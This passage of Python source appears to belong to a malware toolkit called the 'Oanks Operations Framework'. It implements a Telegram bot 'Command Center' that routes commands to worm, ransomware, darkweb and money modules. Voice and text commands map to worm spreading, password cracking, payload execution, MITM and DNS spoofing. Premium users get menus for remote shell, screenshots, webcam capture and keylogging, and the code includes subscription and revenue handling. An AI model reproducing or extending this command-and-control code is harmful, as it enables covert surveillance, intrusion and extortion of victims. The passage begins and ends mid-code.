        file_upload = OanksFileUpload(file_id=file_id, file_name=file_name, file_size=file_size, mime_type=mime_type, uploader_id=user_id)
        if not file_upload.is_valid:
            error_msg = OanksConfig.ERROR_FILE_INVALID.format(formats=", ".join(OanksConfig.ALLOWED_UPLOAD_EXTENSIONS))
            if file_size > OanksConfig.MAX_FILE_SIZE_MB * 1024 * 1024:
                error_msg = OanksConfig.ERROR_FILE_TOO_LARGE.format(max_size=OanksConfig.MAX_FILE_SIZE_MB)
            self._api.send_message(chat_id, error_msg, parse_mode="HTML")
            return "FILE_INVALID"
        result = self._cc.execute_file_upload(user_id, file_upload)
        self._send_result(chat_id, result)
        return f"FILE:{file_name}"

    def _handle_photo_message(self, chat_id: int, user_id: int, message: Dict) -> Optional[str]:
        photos = message.get("photo", [])
        if photos:
            largest = max(photos, key=lambda p: p.get("file_size", 0))
            file_id = largest.get("file_id", "")
            self._logger.info(f"Photo received from {user_id}: {file_id}")
            self._api.send_message(chat_id,
                f"📷 <b>Photo received.</b>\nImage processing is available via /shell commands.\n{OanksBranding.FOOTER}",
                parse_mode="HTML")
        return "PHOTO"

    def _handle_inline_query(self, inline_query: Dict[str, Any]) -> Optional[str]:
        query_id = inline_query.get("id", "")
        query_text = inline_query.get("query", "")
        from_user = inline_query.get("from", {})
        user_id = from_user.get("id", 0)
        self._logger.info(f"Inline query from {user_id}: {query_text}")
        results = self._cc._build_inline_results(user_id, query_text)
        self._api._make_request("answerInlineQuery", {
            "inline_query_id": query_id, "results": results,
            "cache_time": 300, "is_personal": True
        })
        return f"INLINE:{query_text}"

    def _handle_chosen_inline_result(self, result: Dict[str, Any]) -> Optional[str]:
        result_id = result.get("result_id", "")
        from_user = result.get("from", {})
        user_id = from_user.get("id", 0)
        query = result.get("query", "")
        self._logger.info(f"Inline result chosen by {user_id}: {result_id}")
        return f"CHOSEN:{result_id}"

    def _handle_edited_message(self, message: Dict[str, Any]) -> Optional[str]:
        from_user = message.get("from", {})
        user_id = from_user.get("id", 0)
        self._logger.info(f"Message edited by {user_id}")
        return "EDITED"

    def _handle_channel_post(self, post: Dict[str, Any]) -> Optional[str]:
        chat = post.get("chat", {})
        chat_id = chat.get("id", 0)
        self._logger.info(f"Channel post in {chat_id}")
        return "CHANNEL"

    def _handle_context_input(self, chat_id: int, user_id: int, text: str, session: OanksUserSession) -> Optional[str]:
        flow_type = session.context.get("flow_type", "")
        flow_data = session.context.get("flow_data", {})
        session.context["awaiting_input"] = False
        result = self._cc._handle_flow_input(user_id, flow_type, text, flow_data)
        self._send_result(chat_id, result)
        return f"FLOW:{flow_type}"

    def _send_result(self, chat_id: int, result: OanksCommandResult) -> None:
        keyboard = None
        if result.keyboard: keyboard = {"inline_keyboard": result.keyboard}
        if result.file_content and result.file_name:
            self._api.send_document(chat_id, result.file_content, result.file_name,
                caption=result.message[:1024] if result.message else None,
                parse_mode=result.parse_mode, reply_markup=keyboard)
        else:
            self._api.send_message(chat_id, result.message, parse_mode=result.parse_mode, reply_markup=keyboard)

    @property
    def stats(self) -> Dict[str, Any]:
        return dict(self._update_stats)


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 7: COMMAND CENTER — THE OVERLORD
# ═══════════════════════════════════════════════════════════════════════════════

class Phase7CommandCenter:
    """Phase 7: Command Center — The Overlord.

    This is the CENTRAL BRAIN of the Oanks Operations Framework.
    It orchestrates all 15 phases, routes commands, manages state,
    handles inter-phase communication, and provides a unified
    Telegram Bot interface.

    Architecture:
        ┌─────────────────────────────────────────┐
        │         Phase7CommandCenter             │
        │              (OVERLORD)                 │
        ├─────────────────────────────────────────┤
        │  Session Manager  │  Rate Limiter     │
        │  Command Router   │  Callback Router  │
        │  Phase Bridge     │  File Processor   │
        │  Voice Handler    │  Pagination       │
        │  Analytics        │  Logging          │
        └─────────────────────────────────────────┘
                      │
        ┌─────────────┼─────────────┬─────────────┐
        │             │             │             │
    Phase 1      Phase 5      Phase 6      Phase 10
    (DB/Log)   (Accounts)   (Premium)    (Worm)
        │             │             │             │
    Phase 8      Phase 9      Phase 11     Phase 12
    (Money)     (Security)   (Ransom)   (Distributed)
        │             │             │             │
    Phase 13     Phase 14     Phase 15
    (Darkweb)    (AI)       (Deploy)

    NO MAIN ENTRY POINT. ZERO EXECUTION ON IMPORT.
    This module is imported and controlled by Phase 15.
    """

    def __init__(self, system: Dict[str, Any]):
        """Initialize the Command Center with system dependencies.

        Args:
            system: Dictionary containing references to all phase modules.
        """
        self._system = system
        self._lock = threading.RLock()
        self._logger = self._init_logger()

        self._db = system.get("db")
        self._premium_mgr = system.get("premium_manager")
        self._user_mgr = system.get("user_manager")
        self._bot_solver = system.get("bot_solver")
        self._referral_mgr = system.get("referral_manager")
        self._coupon_mgr = system.get("coupon_manager")
        self._analytics = system.get("analytics")
        self._admin_ctrl = system.get("admin_controller")
        self._account_factory = system.get("phase5_account_factory")
        self._money_module = system.get("phase8_money")
        self._security_module = system.get("phase9_security")
        self._worm_module = system.get("phase10_worm")
        self._ransom_module = system.get("phase11_ransom")
        self._distributed_module = system.get("phase12_distributed")
        self._darkweb_module = system.get("phase13_darkweb")
        self._ai_module = system.get("phase14_ai")
        self._shell_module = system.get("phase3_exploit") or system.get("phase4_shell")

        self._api = TelegramAPI()
        self._webhook = TelegramWebhookHandler(self, self._api)

        self._sessions: Dict[int, OanksUserSession] = {}
        self._session_lock = threading.RLock()
        self._session_cleanup_thread: Optional[threading.Thread] = None
        self._session_cleanup_running = False

        self._rate_limits: Dict[int, deque] = defaultdict(deque)
        self._rate_limit_lock = threading.RLock()

        self._commands: Dict[str, Callable] = {}
        self._callbacks: Dict[str, Callable] = {}
        self._command_stats = Counter()
        self._callback_stats = Counter()

        self._pagination: Dict[str, OanksPaginationState] = {}
        self._pagination_lock = threading.RLock()

        self._file_cache: Dict[str, OanksFileUpload] = {}
        self._file_cache_lock = threading.RLock()

        self._voice_cache: Dict[str, OanksVoiceCommand] = {}
        self._voice_cache_lock = threading.RLock()

        self._flows: Dict[int, Dict[str, Any]] = {}
        self._flow_lock = threading.RLock()

        self._start_time = time.time()
        self._total_commands = 0
        self._total_callbacks = 0
        self._total_errors = 0
        self._command_history: deque = deque(maxlen=10000)

        self._build_command_registry()
        self._build_callback_registry()

        self._logger.info(
            f"👑 OANKS PHASE 7 COMMAND CENTER INITIALIZED 👑\n"
            f"   Version: {OanksBranding.VERSION}\n"
            f"   Codename: {OanksBranding.CODENAME}\n"
            f"   Creator: {OanksBranding.CREATOR}\n"
            f"   Commands Registered: {len(self._commands)}\n"
            f"   Callbacks Registered: {len(self._callbacks)}"
        )

    def _init_logger(self) -> logging.Logger:
        logger = logging.getLogger("OanksCommandCenter")
        logger.setLevel(OanksConfig.LOG_LEVEL)
        if not logger.handlers:
            handler = logging.StreamHandler()
            handler.setLevel(OanksConfig.LOG_LEVEL)
            formatter = logging.Formatter(OanksConfig.LOG_FORMAT, datefmt=OanksConfig.LOG_DATE_FORMAT)
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        return logger

    def initialize(self) -> None:
        """Start background services after construction."""
        self._logger.info("Initializing Phase 7 services...")
        self._start_session_cleanup()
        self._validate_phase_connections()
        self._logger.info(OanksBranding.BANNER_FULL)
        self._logger.info("✅ Phase 7 Command Center fully operational")

    def shutdown(self) -> None:
        """Graceful shutdown of Command Center services."""
        self._logger.info("🛑 Shutting down Phase 7 Command Center...")
        self._session_cleanup_running = False
        if self._session_cleanup_thread and self._session_cleanup_thread.is_alive():
            self._session_cleanup_thread.join(timeout=5.0)
        with self._session_lock: self._sessions.clear()
        with self._rate_limit_lock: self._rate_limits.clear()
        with self._pagination_lock: self._pagination.clear()
        with self._file_cache_lock: self._file_cache.clear()
        with self._voice_cache_lock: self._voice_cache.clear()
        self._logger.info("👑 Phase 7 Command Center shutdown complete")

    def _validate_phase_connections(self) -> None:
        phases = {
            "Phase 1 (Database)": self._db is not None,
            "Phase 5 (Account Factory)": self._account_factory is not None,
            "Phase 6 (Premium)": self._premium_mgr is not None,
            "Phase 6 (User Manager)": self._user_mgr is not None,
            "Phase 6 (Referral)": self._referral_mgr is not None,
            "Phase 6 (Coupon)": self._coupon_mgr is not None,
            "Phase 6 (Analytics)": self._analytics is not None,
            "Phase 6 (Admin)": self._admin_ctrl is not None,
            "Phase 8 (Money)": self._money_module is not None,
            "Phase 9 (Security)": self._security_module is not None,
            "Phase 10 (Worm)": self._worm_module is not None,
            "Phase 11 (Ransom)": self._ransom_module is not None,
            "Phase 12 (Distributed)": self._distributed_module is not None,
            "Phase 13 (Darkweb)": self._darkweb_module is not None,
            "Phase 14 (AI)": self._ai_module is not None,
            "Phase 3/4 (Shell)": self._shell_module is not None,
        }
        for phase_name, available in phases.items():
            status = "✅ CONNECTED" if available else "⬜ OFFLINE"
            self._logger.info(f"   {phase_name}: {status}")

    def _get_or_create_session(self, telegram_id: int, username: Optional[str] = None,
                                first_name: Optional[str] = None, last_name: Optional[str] = None,
                                language_code: str = "en") -> OanksUserSession:
        with self._session_lock:
            if telegram_id in self._sessions:
                session = self._sessions[telegram_id]
                if username: session.username = username
                if first_name: session.first_name = first_name
                if last_name: session.last_name = last_name
                if language_code: session.language_code = language_code
                return session

            is_admin = False
            if self._admin_ctrl:
                try: is_admin = self._admin_ctrl.is_admin(telegram_id)
                except Exception as e: self._logger.warning(f"Admin check failed for {telegram_id}: {e}")

            is_premium = False
            if self._premium_mgr:
                try: is_premium = self._premium_mgr.check_premium(telegram_id)
                except Exception as e: self._logger.warning(f"Premium check failed for {telegram_id}: {e}")

            session = OanksUserSession(
                telegram_id=telegram_id, username=username, first_name=first_name,
                last_name=last_name, language_code=language_code,
                is_premium=is_premium, is_admin=is_admin
            )
            self._sessions[telegram_id] = session
            self._logger.info(
                f"New session for {telegram_id} ({username or 'no_username'}) — "
                f"Admin: {is_admin}, Premium: {is_premium}"
            )
            return session

    def _get_session(self, telegram_id: int) -> Optional[OanksUserSession]:
        with self._session_lock:
            return self._sessions.get(telegram_id)

    def _remove_session(self, telegram_id: int) -> bool:
        with self._session_lock:
            if telegram_id in self._sessions:
                del self._sessions[telegram_id]
                self._logger.info(f"Session removed for {telegram_id}")
                return True
            return False

    def _start_session_cleanup(self) -> None:
        self._session_cleanup_running = True
        def cleanup_loop():
            while self._session_cleanup_running:
                try:
                    time.sleep(60)
                    self._cleanup_expired_sessions()
                except Exception as e:
                    self._logger.error(f"Session cleanup error: {e}")
        self._session_cleanup_thread = threading.Thread(target=cleanup_loop, name="OanksSessionCleanup", daemon=True)
        self._session_cleanup_thread.start()
        self._logger.info("Session cleanup thread started")

    def _cleanup_expired_sessions(self) -> None:
        expired = []
        with self._session_lock:
            for uid, session in list(self._sessions.items()):
                if session.is_expired(): expired.append(uid)
            for uid in expired: del self._sessions[uid]
        if expired: self._logger.info(f"Cleaned up {len(expired)} expired sessions")

    def _check_rate_limit(self, session: OanksUserSession) -> bool:
        user_id = session.telegram_id
        limit = OanksConfig.RATE_LIMIT_ADMIN if session.is_admin else OanksConfig.RATE_LIMIT_DEFAULT
        with self._rate_limit_lock:
            now = time.time()
            window = 60.0
            queue = self._rate_limits[user_id]
            while queue and (now - queue[0]) > window: queue.popleft()
            if len(queue) >= limit + OanksConfig.RATE_LIMIT_BURST:
                self._logger.warning(f"Rate limit exceeded for {user_id} ({len(queue)} requests in window)")
                return False
            queue.append(now)
            return True

    def _get_rate_limit_status(self, user_id: int) -> Dict[str, Any]:
        with self._rate_limit_lock:
            now = time.time()
            window = 60.0
            q = self._rate_limits.get(user_id, deque())
            valid_requests = [t for t in q if (now - t) <= window]
            return {
                "user_id": user_id,
                "requests_in_window": len(valid_requests),
                "limit": OanksConfig.RATE_LIMIT_DEFAULT,
                "remaining": max(0, OanksConfig.RATE_LIMIT_DEFAULT - len(valid_requests)),
                "reset_in": max(0, window - valid_requests[0]) if valid_requests else 0
            }

    def _build_command_registry(self) -> None:
        self._commands = {}
        for name in dir(self):
            if name.startswith("_"): continue
            method = getattr(self, name)
            if callable(method) and hasattr(method, "_oanks_command"):
                cmd_name = f"/{method._oanks_command_name}"
                self._commands[cmd_name] = method
                aliases = getattr(method, "_oanks_aliases", [])
                for alias in aliases: self._commands[alias] = method
        self._logger.info(f"Registered {len(self._commands)} command handlers")

    def _build_callback_registry(self) -> None:
        self._callbacks = {}
        for name in dir(self):
            if name.startswith("_"): continue
            method = getattr(self, name)
            if callable(method) and hasattr(method, "_oanks_callback"):
                action = method._oanks_callback_action
                self._callbacks[action] = method
        self._logger.info(f"Registered {len(self._callbacks)} callback handlers")

    def execute_command(self, telegram_id: int, command: str, args: List[str]) -> Union[str, OanksCommandResult]:
        start_time = time.perf_counter()
        try:
            cmd_key = command.lower().strip()
            if " " in cmd_key:
                parts = cmd_key.split()
                cmd_key = parts[0] + "_" + "_".join(parts[1:])

            handler = self._commands.get(cmd_key)
            if not handler: handler = self._fuzzy_match_command(cmd_key)
            if not handler:
                return OanksCommandResult.error(
                    f"🚫 <b>UNKNOWN COMMAND</b> 🚫\n\n"
                    f"Command <code>{html.escape(cmd_key)}</code> not found.\n"
                    f"Use /help to see all available commands.\n"
                    f"{OanksBranding.FOOTER}"
                )

            session = self._get_session(telegram_id)
            if not session: return OanksCommandResult.error(OanksConfig.ERROR_SESSION_EXPIRED)

            if handler._oanks_admin_only and not session.is_admin:
                self._logger.warning(f"Admin command {cmd_key} attempted by non-admin {telegram_id}")
                return OanksCommandResult.error(OanksConfig.ERROR_UNAUTHORIZED)

            if handler._oanks_premium_only and not session.is_premium:
                self._logger.info(f"Premium command {cmd_key} attempted by non-premium {telegram_id}")
                return OanksCommandResult.error(OanksConfig.ERROR_NOT_PREMIUM)

            self._total_commands += 1
            self._command_stats[cmd_key] += 1
            result = handler(self, telegram_id, args)
            if isinstance(result, str): result = OanksCommandResult.ok(result)

            elapsed = time.perf_counter() - start_time
            self._command_history.append({
                "timestamp": time.time(), "user_id": telegram_id, "command": cmd_key,
                "args": args, "success": result.success if isinstance(result, OanksCommandResult) else True,
                "duration": elapsed
            })
            self._logger.debug(f"Command {cmd_key} executed for {telegram_id} in {elapsed:.3f}s")
            return result

        except Exception as e:
            self._total_errors += 1
            elapsed = time.perf_counter() - start_time
            self._logger.error(f"Command {command} failed for {telegram_id}: {str(e)}\nDuration: {elapsed:.3f}s\nTraceback: {traceback.format_exc()}")
            return OanksCommandResult.error(f"{OanksConfig.ERROR_INTERNAL}\n\n<code>{html.escape(str(e))}</code>")

    def _fuzzy_match_command(self, cmd_key: str) -> Optional[Callable]:
        candidates = []
        for registered_cmd, handler in self._commands.items():
            dist = self._levenshtein_distance(cmd_key, registered_cmd)
            if dist <= 2: candidates.append((dist, registered_cmd, handler))
        if candidates:
            candidates.sort(key=lambda x: x[0])
            return candidates[0][2]
        return None

    def _levenshtein_distance(self, s1: str, s2: str) -> int:
        if len(s1) < len(s2): return self._levenshtein_distance(s2, s1)
        if len(s2) == 0: return len(s1)
        previous_row = range(len(s2) + 1)
        for i, c1 in enumerate(s1):
            current_row = [i + 1]
            for j, c2 in enumerate(s2):
                insertions = previous_row[j + 1] + 1
                deletions = current_row[j] + 1
                substitutions = previous_row[j] + (c1 != c2)
                current_row.append(min(insertions, deletions, substitutions))
            previous_row = current_row
        return previous_row[-1]

    def execute_callback(self, telegram_id: int, data: str, message_id: Optional[int] = None,
                         chat_id: Optional[int] = None) -> Union[str, OanksCommandResult]:
        try:
            self._total_callbacks += 1
            parts = data.split(":")
            action = parts[0]
            params = parts[1:] if len(parts) > 1 else []
            handler = self._callbacks.get(action)
            if not handler:
                self._logger.warning(f"Unknown callback action: {action}")
                return OanksCommandResult.error(f"⚠️ Unknown callback: {html.escape(action)}")

            callback_query = {
                "id": f"cb_{int(time.time() * 1000)}", "from": {"id": telegram_id},
                "data": data, "message": {"message_id": message_id, "chat": {"id": chat_id}},
                "params": params
            }
            result = handler(self, callback_query)
            if isinstance(result, str): result = OanksCommandResult.ok(result)
            self._callback_stats[action] += 1
            self._logger.debug(f"Callback {action} executed for {telegram_id}")
            return result
        except Exception as e:
            self._total_errors += 1
            self._logger.error(f"Callback {data} failed: {str(e)}")
            return OanksCommandResult.error(f"Callback error: {html.escape(str(e))}")

    def execute_voice_command(self, telegram_id: int, voice_cmd: OanksVoiceCommand) -> OanksCommandResult:
        try:
            file_info = self._api.get_file(voice_cmd.file_id)
            file_path = file_info.get("file_path", "")
            if file_path:
                voice_bytes = self._api.download_file(file_path)
                voice_cmd.content = voice_bytes

            transcription = self._transcribe_voice(voice_cmd)
            voice_cmd.transcription = transcription
            if not transcription:
                return OanksCommandResult.error(
                    "🎙️ <b>TRANSCRIPTION FAILED</b> 🎙️\n\n"
                    "Could not understand your voice command.\n"
                    "Please speak clearly or use text commands."
                )

            parsed = self._parse_voice_transcription(transcription)
            voice_cmd.parsed_command = parsed.get("command")
            voice_cmd.parsed_args = parsed.get("args", [])

            if voice_cmd.parsed_command:
                result = self.execute_command(telegram_id, voice_cmd.parsed_command, voice_cmd.parsed_args)
                if isinstance(result, OanksCommandResult):
                    result.message = (
                        f"🎙️ <b>Voice Command:</b> <i>{html.escape(transcription)}</i>\n"
                        f"➡️ <b>Interpreted as:</b> <code>{html.escape(voice_cmd.parsed_command)}</code>\n"
                        f"{'─' * 30}\n\n" + result.message
                    )
                return result

            return OanksCommandResult.error(
                f"🎙️ <b>Voice Command:</b> <i>{html.escape(transcription)}</i>\n\n"
                f"Could not identify a valid command. Try /help for available commands."
            )
        except Exception as e:
            self._logger.error(f"Voice command failed: {str(e)}")
            return OanksCommandResult.error(f"🎙️ Voice processing error: {html.escape(str(e))}")

    def _transcribe_voice(self, voice_cmd: OanksVoiceCommand) -> Optional[str]:
        if self._ai_module:
            try:
                result = self._ai_module.transcribe_audio(
                    audio_data=voice_cmd.content, language=voice_cmd.language, duration=voice_cmd.duration
                )
                if result and result.get("text"):
                    voice_cmd.confidence = result.get("confidence", 0.8)
                    return result["text"]
            except Exception as e:
                self._logger.warning(f"AI transcription failed: {e}")
        self._logger.info("Using fallback voice transcription")
        return None

    def _parse_voice_transcription(self, text: str) -> Dict[str, Any]:
        text_lower = text.lower().strip()
        patterns = {
            r"^(start|begin|hello|hi)$": "/start",
            r"^(help|commands|what can you do)$": "/help",
            r"^(status|how are you|system status)$": "/status",
            r"^(my status|account status|premium status)$": "/premium_status",
            r"^(price|pricing|how much|cost)$": "/price",
            r"^(referral|invite|invite friend)$": "/referral",
            r"^(stats|statistics|numbers)$": "/stats",
            r"^(worm status|worm check)$": "/worm_status",
            r"^(shell|terminal|command line)$": "/shell",
            r"^(screenshot|screen|capture)$": "/screenshot",
            r"^(webcam|camera|video)$": "/webcam",
            r"^(upload|send file|file upload)$": "/upload",
            r"^(download|get file|fetch)$": "/download",
            r"^(keylog|keyboard|keys)$": "/keylog_start",
            r"^(broadcast|announce|message all)$": "/admin_broadcast",
            r"^(restart|reboot|reload)$": "/admin_restart",
            r"^(shutdown|stop|power off)$": "/admin_shutdown",
            r"^(backup|save|export)$": "/admin_backup",
            r"^(logs|log files|system logs)$": "/admin_logs",
            r"^(analytics|analysis|report)$": "/admin_analytics",
            r"^(revenue|money|earnings|income)$": "/admin_revenue",
            r"^(users|user list|all users)$": "/admin_users",
            r"^(ban|block|kick)$": "/admin_ban",
            r"^(unban|unblock|allow)$": "/admin_unban",
            r"^(coupon|discount|code)$": "/coupon",
            r"^(verify|check|validate)$": "/verify",
            r"^(oanks|creator|who made you)$": "/oanks",
            r"^(boss|admin|master)$": "/boss",
        }
        for pattern, command in patterns.items():
            if re.match(pattern, text_lower): return {"command": command, "args": []}

        words = text_lower.split()
        if len(words) >= 2:
            verb, noun = words[0], words[1]
            remaining = words[2:]
            command_map = {
                ("scan", "target"): "/worm_scan", ("crack", "password"): "/worm_crack",
                ("spread", "worm"): "/worm_spread", ("execute", "payload"): "/worm_payload",
                ("mitm", "attack"): "/worm_mitm", ("dns", "spoof"): "/worm_dns",
                ("create", "account"): "/admin_premium_add", ("remove", "premium"): "/admin_premium_remove",
                ("send", "message"): "/admin_broadcast", ("create", "coupon"): "/admin_coupon_create",
                ("delete", "coupon"): "/admin_coupon_delete", ("list", "coupons"): "/admin_coupon_list",
                ("list", "premium"): "/admin_premium_list", ("add", "premium"): "/admin_premium_add",
                ("confirm", "payment"): "/admin_payments_confirm",
            }
            mapped = command_map.get((verb, noun))
            if mapped: return {"command": mapped, "args": remaining}
        return {"command": None, "args": []}

    def execute_file_upload(self, telegram_id: int, file_upload: OanksFileUpload) -> OanksCommandResult:
        try:
            file_info = self._api.get_file(file_upload.file_id)
            file_path = file_info.get("file_path", "")
            if file_path:
                content = self._api.download_file(file_path)
                file_upload.content = content
                file_upload.file_path = file_path

            cache_key = f"{telegram_id}_{file_upload.file_id}"
            with self._file_cache_lock: self._file_cache[cache_key] = file_upload

            parsed = self._parse_uploaded_file(file_upload)
            file_upload.parsed_data = parsed

            response = (
                f"📁 <b>FILE UPLOADED SUCCESSFULLY</b> 📁\n\n"
                f"<b>Filename:</b> <code>{html.escape(file_upload.file_name)}</code>\n"
                f"<b>Size:</b> {self._format_bytes(file_upload.file_size)}\n"
                f"<b>Type:</b> {html.escape(file_upload.mime_type)}\n"
                f"<b>Extension:</b> <code>{file_upload.extension}</code>\n"
            )
            if parsed: response += f"\n<b>Parsed Records:</b> {len(parsed) if isinstance(parsed, list) else 'N/A'}\n"
            response += f"\n{OanksBranding.FOOTER}"

            keyboard = self._build_file_action_keyboard(cache_key, file_upload.extension)
            return OanksCommandResult.ok(response, keyboard=keyboard)
        except Exception as e:
            self._logger.error(f"File upload failed: {str(e)}")
            return OanksCommandResult.error(f"📁 File processing error: {html.escape(str(e))}")

    def _parse_uploaded_file(self, file_upload: OanksFileUpload) -> Optional[Any]:
        if not file_upload.content: return None
        ext = file_upload.extension
        try:
            if ext == ".json": return json.loads(file_upload.content.decode("utf-8"))
            elif ext == ".csv":
                content = file_upload.content.decode("utf-8")
                reader = csv.DictReader(io.StringIO(content))
                return list(reader)
            elif ext in (".xlsx", ".xls"):
                self._logger.info("Excel parsing requires additional libraries")
                return {"type": "excel", "note": "Parse with openpyxl"}
            elif ext in (".txt", ".log"): return file_upload.content.decode("utf-8")
            else: return {"raw_size": len(file_upload.content)}
        except Exception as e:
            self._logger.error(f"File parse error: {e}")
            return None

    def _build_file_action_keyboard(self, cache_key: str, extension: str) -> List[List[Dict]]:
        buttons = []
        if extension == ".csv":
            buttons.append([
                {"text": f"{OanksBranding.EMOJI_STATS} Analyze CSV", "callback_data": f"file_analyze:{cache_key}"},
                {"text": f"{OanksBranding.EMOJI_UPLOAD} Import Data", "callback_data": f"file_import:{cache_key}"}
            ])
        elif extension == ".json":
            buttons.append([
                {"text": f"{OanksBranding.EMOJI_JSON} Validate JSON", "callback_data": f"file_validate:{cache_key}"},
                {"text": f"{OanksBranding.EMOJI_UPLOAD} Import Config", "callback_data": f"file_import:{cache_key}"}
            ])
        elif extension in (".xlsx", ".xls"):
            buttons.append([{"text": f"{OanksBranding.EMOJI_EXCEL} Parse Excel", "callback_data": f"file_parse:{cache_key}"}])
        buttons.append([
            {"text": f"{OanksBranding.EMOJI_DOWNLOAD} Download", "callback_data": f"file_download:{cache_key}"},
            {"text": f"{OanksBranding.EMOJI_CROSS} Delete", "callback_data": f"file_delete:{cache_key}"}
        ])
        buttons.append([{"text": f"{OanksBranding.EMOJI_BACK} Back", "callback_data": "menu_main"}])
        return buttons

    def _handle_flow_input(self, telegram_id: int, flow_type: str, text: str, flow_data: Dict) -> OanksCommandResult:
        step = flow_data.get("step", 0)
        if flow_type == "broadcast": return self._flow_broadcast(telegram_id, step, text, flow_data)
        elif flow_type == "coupon_create": return self._flow_coupon_create(telegram_id, step, text, flow_data)
        elif flow_type == "admin_ban": return self._flow_admin_ban(telegram_id, step, text, flow_data)
        elif flow_type == "shell_command": return self._flow_shell_command(telegram_id, step, text, flow_data)
        elif flow_type == "worm_target": return self._flow_worm_target(telegram_id, step, text, flow_data)
        else: return OanksCommandResult.error(f"Unknown flow type: {flow_type}")

    def _format_bytes(self, size: int) -> str:
        for unit in ["B", "KB", "MB", "GB"]:
            if size < 1024: return f"{size:.1f} {unit}"
            size /= 1024
        return f"{size:.1f} TB"

    def generate_inline_keyboard(self, options: List[Dict]) -> str:
        keyboard = {"inline_keyboard": [options]}
        return json.dumps(keyboard)

    def _build_main_menu_keyboard(self, session: OanksUserSession) -> List[List[Dict]]:
        keyboard = [
            [{"text": f"{OanksBranding.EMOJI_USER} User Commands", "callback_data": "menu_user"},
             {"text": f"{OanksBranding.EMOJI_PREMIUM} Premium", "callback_data": "menu_premium"}],
            [{"text": f"{OanksBranding.EMOJI_PRICE} Pricing", "callback_data": "menu_price"},
             {"text": f"{OanksBranding.EMOJI_REFERRAL} Referrals", "callback_data": "menu_referral"}],
            [{"text": f"{OanksBranding.EMOJI_STATUS} System Status", "callback_data": "menu_status"},
             {"text": f"{OanksBranding.EMOJI_STATS} Statistics", "callback_data": "menu_stats"}],
            [{"text": f"{OanksBranding.EMOJI_INFO} Help", "callback_data": "menu_help"},
             {"text": f"{OanksBranding.EMOJI_CROWN} Oanks", "callback_data": "menu_oanks"}]
        ]
        if session.is_admin:
            keyboard.insert(0, [{"text": f"{OanksBranding.EMOJI_ADMIN} 🔥 ADMIN PANEL 🔥", "callback_data": "menu_admin"}])
        if session.is_premium:
            idx = 1 if session.is_admin else 0
            keyboard.insert(idx, [
                {"text": f"{OanksBranding.EMOJI_WORM} Worm Module", "callback_data": "menu_worm"},
                {"text": f"{OanksBranding.EMOJI_SHELL} Shell Access", "callback_data": "menu_shell"}
            ])
        return keyboard

    def _build_admin_menu_keyboard(self) -> List[List[Dict]]:
        return [
            [{"text": f"{OanksBranding.EMOJI_USER} Users", "callback_data": "admin_menu_users"},
             {"text": f"{OanksBranding.EMOJI_PREMIUM} Premium Mgmt", "callback_data": "admin_menu_premium"}],
            [{"text": f"{OanksBranding.EMOJI_MONEY} Payments", "callback_data": "admin_menu_payments"},
             {"text": f"{OanksBranding.EMOJI_COUPON} Coupons", "callback_data": "admin_menu_coupons"}],
            [{"text": f"{OanksBranding.EMOJI_BROADCAST} Broadcast", "callback_data": "admin_menu_broadcast"},
             {"text": f"{OanksBranding.EMOJI_LOGS} Logs", "callback_data": "admin_menu_logs"}],
            [{"text": f"{OanksBranding.EMOJI_ANALYTICS} Analytics", "callback_data": "admin_menu_analytics"},
             {"text": f"{OanksBranding.EMOJI_REVENUE} Revenue", "callback_data": "admin_menu_revenue"}],
            [{"text": f"{OanksBranding.EMOJI_STATS} Stats", "callback_data": "admin_menu_stats"},
             {"text": f"{OanksBranding.EMOJI_BACKUP} Backup", "callback_data": "admin_menu_backup"}],
            [{"text": f"{OanksBranding.EMOJI_RESTART} Restart", "callback_data": "admin_menu_restart"},
             {"text": f"{OanksBranding.EMOJI_SHUTDOWN} Shutdown", "callback_data": "admin_menu_shutdown"},
             {"text": f"{OanksBranding.EMOJI_KILL} Kill", "callback_data": "admin_menu_kill"}],
            [{"text": f"{OanksBranding.EMOJI_BACK} Back to Main", "callback_data": "menu_main"}]
        ]

    def _build_worm_menu_keyboard(self) -> List[List[Dict]]:
        return [
            [{"text": f"{OanksBranding.EMOJI_STATUS} Status", "callback_data": "worm_menu_status"},
             {"text": f"{OanksBranding.EMOJI_SPREAD} Spread", "callback_data": "worm_menu_spread"}],
            [{"text": f"{OanksBranding.EMOJI_TARGET} Target", "callback_data": "worm_menu_target"},
             {"text": f"{OanksBranding.EMOJI_PAYLOAD} Payload", "callback_data": "worm_menu_payload"}],
            [{"text": f"{OanksBranding.EMOJI_SCAN} Scan", "callback_data": "worm_menu_scan"},
             {"text": f"{OanksBranding.EMOJI_CRACK} Crack", "callback_data": "worm_menu_crack"}],
            [{"text": f"{OanksBranding.EMOJI_MITM} MITM", "callback_data": "worm_menu_mitm"},
             {"text": f"{OanksBranding.EMOJI_DNS} DNS", "callback_data": "worm_menu_dns"}],
            [{"text": f"{OanksBranding.EMOJI_BACK} Back to Main", "callback_data": "menu_main"}]
        ]

    def _build_shell_menu_keyboard(self) -> List[List[Dict]]:
        return [
            [{"text": f"{OanksBranding.EMOJI_COMMAND} Shell", "callback_data": "shell_menu_shell"},
             {"text": f"{OanksBranding.EMOJI_UPLOAD} Upload", "callback_data": "shell_menu_upload"}],
            [{"text": f"{OanksBranding.EMOJI_DOWNLOAD} Download", "callback_data": "shell_menu_download"},
             {"text": f"{OanksBranding.EMOJI_SCREENSHOT} Screenshot", "callback_data": "shell_menu_screenshot"}],
            [{"text": f"{OanksBranding.EMOJI_WEBCAM} Webcam", "callback_data": "shell_menu_webcam"},
             {"text": f"{OanksBranding.EMOJI_KEYLOG} Keylog", "callback_data": "shell_menu_keylog"}],
            [{"text": f"{OanksBranding.EMOJI_BACK} Back to Main", "callback_data": "menu_main"}]
        ]

    def _build_pagination_keyboard(self, pag_state: OanksPaginationState, action_prefix: str) -> List[List[Dict]]:
        buttons = []
        nav_row = []
        if pag_state.has_prev:
            nav_row.append({"text": f"{OanksBranding.EMOJI_PREV} Prev", "callback_data": f"{action_prefix}:page:{pag_state.current_page - 1}"})
        nav_row.append({"text": f"📄 {pag_state.current_page + 1}/{pag_state.total_pages}", "callback_data": "noop"})
        if pag_state.has_next:
            nav_row.append({"text": f"{OanksBranding.EMOJI_NEXT} Next", "callback_data": f"{action_prefix}:page:{pag_state.current_page + 1}"})
        buttons.append(nav_row)
        buttons.append([
            {"text": f"{OanksBranding.EMOJI_REFRESH} Refresh", "callback_data": f"{action_prefix}:refresh:{pag_state.current_page}"},
            {"text": f"{OanksBranding.EMOJI_HOME} Main Menu", "callback_data": "menu_main"}
        ])
